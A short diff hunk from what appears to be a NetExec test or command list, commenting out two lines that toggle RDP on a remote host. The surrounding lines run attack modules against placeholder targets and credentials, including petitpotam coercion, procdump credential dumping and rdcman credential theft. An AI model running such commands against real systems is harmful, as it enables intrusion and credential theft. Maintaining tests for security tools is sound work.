@@ -62,8 +62,8 @@ netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M petitpotam
 netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M procdump
 netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdcman
 netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp --options
-netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable
-netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=disable
+#netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable
+#netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=disable
 netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M reg-query -o PATH=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion KEY=DevicePath
 netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M runasppl
 netexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M scuffy -o SERVER=127.0.0.1 NAME=test
